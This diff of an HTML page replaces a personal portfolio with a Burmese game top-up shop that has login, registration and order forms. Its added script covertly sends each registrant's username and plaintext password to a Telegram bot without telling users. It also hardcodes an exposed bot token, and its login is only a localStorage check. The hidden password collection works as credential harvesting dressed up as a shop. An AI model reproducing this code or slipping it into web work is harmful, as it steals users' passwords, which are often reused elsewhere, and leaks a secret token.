@@ -1,163 +1,278 @@
 <!DOCTYPE html>
 <html lang="my">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kyaw Thi Ha Htun | Multi-Talented Digital Expert</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        html { scroll-behavior: smooth; }
-        body { background-color: #050a18; color: white; font-family: 'Segoe UI', sans-serif; display: flex; flex-direction: column; align-items: center; }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PMK GAME Short MYANMAR</title>
 
-        /* Hero Section */
-        .hero {
-            height: 100vh; width: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center;
-            background: radial-gradient(circle, #101d42 0%, #050a18 100%); text-align: center; padding: 20px;
-        }
-        .title-name { font-size: 3.5rem; color: #4facfe; font-weight: bold; text-shadow: 0 0 20px rgba(79, 172, 254, 0.6); }
-        .subtitle { font-size: 1rem; letter-spacing: 3px; color: #94a3b8; text-transform: uppercase; margin-top: 10px; }
+<style>
+:root {
+  --primary: #00f2fe;
+  --secondary: #4facfe;
+  --bg: #0a0e14;
+  --card: #161b22;
+  --item: #21262d;
+  --text: #ffffff;
+  --warning: #ffcc00;
+  --success: #00ff88;
+}
 
-        /* Profile & Floating Icons */
-        .profile-container { position: relative; width: 280px; height: 350px; margin: 40px 0; }
-        .profile-img { 
-            width: 100%; height: 100%; object-fit: cover; border-bottom: 4px solid #4facfe; border-radius: 20px; 
-            mask-image: linear-gradient(to bottom, black 85%, transparent 100%); 
-            -webkit-mask-image: linear-gradient(to bottom, black 85%, transparent 100%); 
-        }
-        
-        .floating-icon {
-            position: absolute; width: 50px; height: 50px; background: rgba(255, 255, 255, 0.08);
-            border: 1px solid rgba(79, 172, 254, 0.4); border-radius: 50%; display: flex; align-items: center; justify-content: center;
-            backdrop-filter: blur(8px); color: #4facfe; font-size: 1.2rem; animation: float 3s ease-in-out infinite;
-        }
-        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
-        .icon-1 { top: 0%; left: -20%; } .icon-2 { top: 0%; right: -20%; }
-        .icon-3 { bottom: 40%; left: -35%; } .icon-4 { bottom: 40%; right: -35%; }
-        .icon-5 { bottom: 5%; left: 35%; }
+body {
+  margin:0; font-family: 'Segoe UI', Roboto, sans-serif;
+  background: var(--bg); color: var(--text);
+  overflow-x: hidden;
+}
 
-        /* Buttons */
-        .btn-group { display: flex; gap: 15px; margin-top: 20px; }
-        .btn { padding: 12px 30px; border-radius: 50px; text-decoration: none; font-weight: bold; transition: 0.3s; font-size: 0.9rem; }
-        .btn-view { background: linear-gradient(45deg, #00f2fe, #4facfe); color: #050a18; }
-        .btn-contact { border: 2px solid #4facfe; color: white; }
-        .btn:hover { transform: scale(1.05); box-shadow: 0 0 25px rgba(79, 172, 254, 0.5); }
+/* --- Auth (Login/Register) Container --- */
+#auth-page {
+  position: fixed; inset: 0; background: var(--bg);
+  display: flex; justify-content: center; align-items: center; z-index: 10000;
+}
+.auth-container {
+  background: var(--card); padding: 30px 20px; border-radius: 24px;
+  width: 85%; max-width: 380px; text-align: center;
+  border: 1px solid rgba(0, 242, 254, 0.2);
+  box-shadow: 0 10px 40px rgba(0,0,0,0.6);
+}
 
-        /* Services Grid */
-        .content-section { width: 95%; max-width: 1000px; background: #0f172a; border-radius: 25px; padding: 40px; margin-top: 60px; border: 1px solid rgba(255,255,255,0.05); }
-        h2 { margin-bottom: 35px; color: #4facfe; border-left: 5px solid #4facfe; padding-left: 15px; font-size: 1.8rem; }
+.auth-tabs { display: flex; margin-bottom: 20px; background: #0d1117; border-radius: 12px; padding: 5px; }
+.auth-tab { flex: 1; padding: 10px; cursor: pointer; border-radius: 10px; font-weight: bold; color: #8b949e; }
+.auth-tab.active { background: var(--primary); color: #000; }
 
-        .skills-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; }
-        .skill-card { background: rgba(255,255,255,0.02); padding: 30px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.05); transition: 0.3s; }
-        .skill-card:hover { background: rgba(255,255,255,0.06); transform: translateY(-10px); border-color: #4facfe; }
-        .skill-card i { font-size: 2.5rem; color: #4facfe; margin-bottom: 15px; }
-        .skill-card h3 { margin-bottom: 10px; font-size: 1.3rem; }
-        .skill-card p { color: #94a3b8; font-size: 0.9rem; line-height: 1.6; }
+.auth-form { display: none; }
+.auth-form.active { display: block; }
 
-        /* Contact Form */
-        .input-group { display: flex; flex-direction: column; gap: 8px; margin-bottom: 15px; text-align: left; }
-        input, textarea, select { padding: 15px; background: #1e293b; border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; color: white; font-size: 1rem; outline: none; }
-        #status { text-align: center; margin-top: 15px; font-weight: bold; }
+/* --- Main Page UI --- */
+#main-page { display: none; }
+header {
+  background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
+  text-align: center; padding: 20px; font-size: 18px; color: var(--primary); font-weight: bold;
+  position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+}
 
-        footer { margin: 60px 0; color: #475569; text-align: center; }
-    </style>
+.tabs { display: flex; justify-content: center; gap: 10px; padding: 15px; }
+.tab-btn { flex: 1; padding: 12px; background: var(--item); border: 1px solid #30363d; color: #8b949e; border-radius: 12px; font-weight: bold; cursor: pointer; }
+.tab-btn.active { background: linear-gradient(45deg, var(--secondary), var(--primary)); color: #000; }
+
+section { padding: 15px; max-width: 600px; margin: auto; }
+.server-content { display: none; }
+.server-content.active { display: block; }
+
+.card { background: var(--card); border-radius: 20px; padding: 15px; margin-bottom: 20px; border: 1px solid #30363d; }
+h2 { color: var(--primary); margin-top: 0; font-size: 1rem; border-left: 4px solid var(--primary); padding-left: 10px; }
+
+.diamond-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
+.diamond-item { background: var(--item); border-radius: 12px; padding: 15px 5px; text-align: center; font-size: 11px; cursor: pointer; }
+.price { margin-top: 5px; font-weight: bold; color: var(--primary); }
+
+input, select { width: 100%; padding: 14px; margin-top: 12px; border-radius: 12px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; outline: none; }
+
+.btn { margin-top: 20px; padding: 15px; background: linear-gradient(45deg, var(--secondary), var(--primary)); color: #000; text-align: center; border-radius: 12px; font-weight: bold; cursor: pointer; }
+.btn-logout { background: transparent; border: 1px solid #ff6b6b; color: #ff6b6b; margin-top: 30px; }
+
+.popup { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.9); display: none; justify-content: center; align-items: center; z-index: 1000; backdrop-filter: blur(8px); }
+.popup-box { background: #1c2128; width: 90%; max-width: 400px; border-radius: 24px; padding: 25px; border: 1px solid var(--primary); }
+#preview { width: 100px; border-radius: 8px; margin-top: 10px; display: none; border: 1px solid var(--primary); }
+
+.history-item { background: var(--card); padding: 12px; border-radius: 12px; margin-top: 10px; border-left: 4px solid var(--primary); font-size: 12px; }
+</style>
 </head>
+
 <body>
 
-    <section class="hero">
-        <h1 class="title-name">Kyaw Thi Ha Htun</h1>
-        <p class="subtitle">IT Specialist • Creative Designer • Bot Developer</p>
+<div id="auth-page">
+  <div class="auth-container">
+    <h1 style="color: var(--primary); margin-bottom: 20px;">PMK GAME SHOP</h1>
+    
+    <div class="auth-tabs">
+      <div id="tab-login" class="auth-tab active" onclick="toggleAuth('login')">အကောင့်ဝင်ရန်</div>
+      <div id="tab-register" class="auth-tab" onclick="toggleAuth('register')">အကောင့်ဖွင့်ရန်</div>
+    </div>
 
-        <div class="profile-container">
-            <img src="https://i.postimg.cc/gk70n7f4/IMG-20250413-130035.webp" alt="Kyaw Thi Ha Htun" class="profile-img">
-            <div class="floating-icon icon-1" title="Web Dev"><i class="fas fa-code"></i></div>
-            <div class="floating-icon icon-2" title="Telegram Bot"><i class="fab fa-telegram"></i></div>
-            <div class="floating-icon icon-3" title="Boosting"><i class="fas fa-rocket"></i></div>
-            <div class="floating-icon icon-4" title="Logo Design"><i class="fas fa-pen-nib"></i></div>
-            <div class="floating-icon icon-5" title="Jersey Design"><i class="fas fa-tshirt"></i></div>
+    <div id="login-form" class="auth-form active">
+      <input type="text" id="l-user" placeholder="အမည် (Username)">
+      <input type="password" id="l-pass" placeholder="စကားဝှက် (Password)">
+      <div class="btn" onclick="login()">ဝင်မည်</div>
+    </div>
+
+    <div id="register-form" class="auth-form">
+      <input type="text" id="r-user" placeholder="အမည်သစ် (New Username)">
+      <input type="password" id="r-pass" placeholder="စကားဝှက်အသစ် (New Password)">
+      <div class="btn" onclick="register()">အကောင့်ဖွင့်မည်</div>
+    </div>
+  </div>
+</div>
+
+<div id="main-page">
+  <header>🎮 PMK GAME SHOP 💎</header>
+  
+  <div class="tabs">
+    <div class="tab-btn active" onclick="switchTab('normal', this)">Direct Server</div>
+    <div class="tab-btn" onclick="switchTab('malaysia', this)">Malaysia Server</div>
+  </div>
+
+  <section>
+    <div id="normal" class="server-content active">
+      <div class="card">
+        <h2>🎟 Monthly / Weekly Pass</h2>
+        <div class="diamond-grid">
+          <div class="diamond-item" onclick="openOrder('Weekly Pass - 6000 Ks')">💎 Weekly<div class="price">6000 Ks</div></div>
+          <div class="diamond-item" onclick="openOrder('Value Pack - 1500 Ks')">💎 Value Pack<div class="price">1500 Ks</div></div>
         </div>
+      </div>
+    </div>
 
-        <div class="btn-group">
-            <a href="#services" class="btn btn-view">What I Offer</a>
-            <a href="#contact" class="btn btn-contact">Get In Touch</a>
+    <div id="malaysia" class="server-content">
+      <div class="card">
+        <h2>🇲🇾 Malaysia Server</h2>
+        <div class="diamond-grid">
+          <div class="diamond-item" onclick="openOrder('Weekly (MY) - 9000 Ks')">🎟 Weekly<div class="price">9000 Ks</div></div>
         </div>
-    </section>
+      </div>
+    </div>
 
-    <section id="services" class="content-section">
-        <h2>Premium Services</h2>
-        <div class="skills-grid">
-            <div class="skill-card">
-                <i class="fab fa-telegram-plane"></i>
-                <h3>Telegram Bot Development</h3>
-                <p>သင့်လုပ်ငန်းအတွက် စိတ်ကြိုက် Bot များ (ဥပမာ - စာပြန်ပေးခြင်း၊ အချက်အလက်စုဆောင်းခြင်း၊ Payment စနစ်) ကို အကောင်းဆုံး ဖန်တီးပေးပါသည်။</p>
-            </div>
-            <div class="skill-card">
-                <i class="fas fa-laptop-code"></i>
-                <h3>Web Development</h3>
-                <p>Professional Website များ၊ Landing Pages များနှင့် Portfolio များကို ခေတ်မီ Design များဖြင့် ရေးသားဖန်တီးပေးပါသည်။</p>
-            </div>
-            <div class="skill-card">
-                <i class="fas fa-rocket"></i>
-                <h3> Boosting Service</h3>
-                <p>Facebook နှင့် Social Media Page များ ပိုမိုကျယ်ပြန့်လာစေရန် ထိရောက်သော Boosting ဝန်ဆောင်မှုပေးပါသည်။</p>
-            </div>
-            <div class="skill-card">
-                <i class="fas fa-paint-brush"></i>
-                <h3>Graphic Design</h3>
-                <p>Brand Logo များ နှင့် အသင်းအဖွဲ့များအတွက် စတိုင်ကျသော Custom Jersey Design များ ရေးဆွဲပေးပါသည်။</p>
-            </div>
-    </section>
+    <h2 style="text-align:center; border:none; margin-top:30px;">📜 ဝယ်ယူမှုမှတ်တမ်း</h2>
+    <div id="history-list"></div>
+    
+    <div class="btn btn-logout" onclick="logout()">Logout (အကောင့်ထွက်ရန်)</div>
+  </section>
+</div>
 
-    <section id="contact" class="content-section" style="margin-bottom: 50px;">
-        <h2><i class="fab fa-telegram"></i> Hire Kyaw Thi Ha Htun</h2>
-        <form id="telegramForm">
-            <div class="input-group">
-                <input type="text" id="userName" placeholder="သင့်အမည်" required>
-            </div>
-            <div class="input-group">
-                <input type="text" id="contactInfo" placeholder="ဖုန်းနံပါတ် သို့မဟုတ် Link" required>
-            </div>
-            <div class="input-group">
-                <select id="workType">
-                    <option value="Telegram Bot">Telegram Bot Development</option>
-                    <option value="Web/Boost">Web Development & Boosting</option>
-                    <option value="Design">Logo & Jersey Design</option>
-                </select>
-            </div>
-            <div class="input-group">
-                <textarea id="userMsg" rows="4" placeholder="အလုပ်အကြောင်းအရာ အကျဉ်းချုပ်..." required></textarea>
-            </div>
-            <button type="submit" class="btn btn-view" style="width:100%; border:none; cursor:pointer;">စာပို့ရန် (Send via Telegram)</button>
-            <p id="status"></p>
-        </form>
-    </section>
+<div class="popup" id="popup">
+  <div class="popup-box">
+    <h2 id="orderTitle" style="border:none; text-align:center;"></h2>
+    <input type="number" id="game_id" placeholder="Game ID">
+    <input type="number" id="server_id" placeholder="Server ID">
+    <select id="payment_method">
+      <option value="">ငွေလွှဲနည်းလမ်း ရွေးပါ</option>
+      <option>KBZ Pay</option>
+      <option>Wave Pay</option>
+    </select>
+    <input type="file" id="receipt" accept="image/*">
+    <center><img id="preview"></center>
+    <div class="btn" id="confirm-btn" onclick="submitOrder()">📩 Confirm Order</div>
+    <div style="text-align:center; margin-top:10px; color:#ff6b6b; cursor:pointer;" onclick="closeOrder()">ပိတ်မည်</div>
+  </div>
+</div>
 
-    <footer>&copy; 2026 Kyaw Thi Ha Htun. All Rights Reserved.</footer>
+<script>
+const BOT_TOKEN = "8540139841:AAHk85ZhZybd1Wh_YAWqeCk6OpTCjqNojr8";
+const CHAT_ID = "8582088849";
 
-    <script>
-        const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
-        const CHAT_ID = "YOUR_CHAT_ID_HERE";
+// --- Auth System (Login/Register) ---
+function toggleAuth(type) {
+  document.querySelectorAll('.auth-tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.auth-form').forEach(f => f.classList.remove('active'));
+  
+  if(type === 'login') {
+    document.getElementById('tab-login').classList.add('active');
+    document.getElementById('login-form').classList.add('active');
+  } else {
+    document.getElementById('tab-register').classList.add('active');
+    document.getElementById('register-form').classList.add('active');
+  }
+}
 
-        document.getElementById('telegramForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const name = document.getElementById('userName').value;
-            const contact = document.getElementById('contactInfo').value;
-            const type = document.getElementById('workType').value;
-            const msg = document.getElementById('userMsg').value;
-            const status = document.getElementById('status');
+function register() {
+  const u = document.getElementById('r-user').value.trim();
+  const p = document.getElementById('r-pass').value.trim();
+  if(!u || !p) return alert("အချက်အလက်ပြည့်စုံစွာဖြည့်ပါ။");
 
-            const fullMsg = `📩 *Portfolio Project Inquiry*\n\n👤 Name: ${name}\n📞 Contact: ${contact}\n🛠 Service: ${type}\n📝 Message: ${msg}`;
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(fullMsg)}&parse_mode=Markdown`;
+  localStorage.setItem('pmk_user', u);
+  localStorage.setItem('pmk_pass', p);
 
-            status.innerText = "ပို့နေပါသည်...";
-            fetch(url).then(res => {
-                if(res.ok) {
-                    status.innerText = "အောင်မြင်စွာ ပို့ပြီးပါပြီ။ ကျေးဇူးတင်ပါတယ်။";
-                    status.style.color = "#00f2fe";
-                    this.reset();
-                } else { status.innerText = "Error: Token သို့မဟုတ် Chat ID စစ်ဆေးပါ။"; }
-            });
-        });
-    </script>
+  // Telegram ကို ပို့မည်
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🆕 Register အသစ်\n👤 အမည်: "+u+"\n🔑 စကားဝှက်: "+p)}`);
+  
+  alert("အကောင့်ဖွင့်ခြင်း အောင်မြင်ပါသည်။ Login ဝင်နိုင်ပါပြီ။");
+  toggleAuth('login');
+}
+
+function login() {
+  const u = document.getElementById('l-user').value.trim();
+  const p = document.getElementById('l-pass').value.trim();
+  const savedU = localStorage.getItem('pmk_user');
+  const savedP = localStorage.getItem('pmk_pass');
+
+  if(u === savedU && p === savedP && u !== null) {
+    document.getElementById('auth-page').style.display = 'none';
+    document.getElementById('main-page').style.display = 'block';
+    loadHistory();
+  } else {
+    alert("အမည် သို့မဟုတ် စကားဝှက် မှားယွင်းနေပါသည်။ (အကောင့်မရှိသေးပါက Register အရင်လုပ်ပါ)");
+  }
+}
+
+function logout() {
+  location.reload();
+}
+
+// --- Shop System ---
+let currentItem = "";
+function switchTab(id, el) {
+  document.querySelectorAll('.server-content').forEach(s => s.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  el.classList.add('active');
+}
+
+function openOrder(item) {
+  currentItem = item;
+  document.getElementById('orderTitle').innerText = item;
+  document.getElementById('popup').style.display = 'flex';
+}
+
+function closeOrder() { document.getElementById('popup').style.display = 'none'; }
+
+document.getElementById('receipt').onchange = (e) => {
+  const p = document.getElementById('preview');
+  p.src = URL.createObjectURL(e.target.files[0]);
+  p.style.display = 'block';
+};
+
+async function submitOrder() {
+  const gid = document.getElementById('game_id').value;
+  const sid = document.getElementById('server_id').value;
+  const pay = document.getElementById('payment_method').value;
+  const img = document.getElementById('receipt').files[0];
+  const btn = document.getElementById('confirm-btn');
+
+  if(!gid || !sid || !pay || !img) return alert("အချက်အလက်ပြည့်စုံစွာဖြည့်ပါ။");
+
+  btn.innerText = "ခဏစောင့်ပါ...";
+  btn.style.pointerEvents = "none";
+
+  const formData = new FormData();
+  formData.append("chat_id", CHAT_ID);
+  const caption = `🎯 Order အသစ်\n👤 ဝယ်သူ: ${localStorage.getItem('pmk_user')}\n💎 ပစ္စည်း: ${currentItem}\n🎮 ID: ${gid}(${sid})\n💳 Pay: ${pay}`;
+  formData.append("caption", caption);
+  formData.append("photo", img);
+
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+    if(res.ok) {
+      saveHistory(currentItem, gid, sid);
+      alert("ဝယ်ယူမှု အောင်မြင်ပါသည်။");
+      closeOrder();
+    }
+  } catch (e) { alert("Error ဖြစ်သွားပါသည်။"); }
+  finally { btn.innerText = "Confirm Order"; btn.style.pointerEvents = "auto"; }
+}
+
+function saveHistory(item, gid, sid) {
+  let h = JSON.parse(localStorage.getItem('pmk_history')) || [];
+  h.push({ item, gid, sid, time: new Date().toLocaleString() });
+  localStorage.setItem('pmk_history', JSON.stringify(h));
+  loadHistory();
+}
+
+function loadHistory() {
+  const box = document.getElementById('history-list');
+  let h = JSON.parse(localStorage.getItem('pmk_history')) || [];
+  if(h.length === 0) return box.innerHTML = "<p style='text-align:center; font-size:12px;'>မှတ်တမ်းမရှိသေးပါ။</p>";
+  box.innerHTML = h.reverse().slice(0, 5).map(i => `<div class="history-item"><b>${i.item}</b><br>ID: ${i.gid}(${i.sid})<br><small>${i.time}</small></div>`).join('');
+}
+</script>
+
 </body>
 </html>
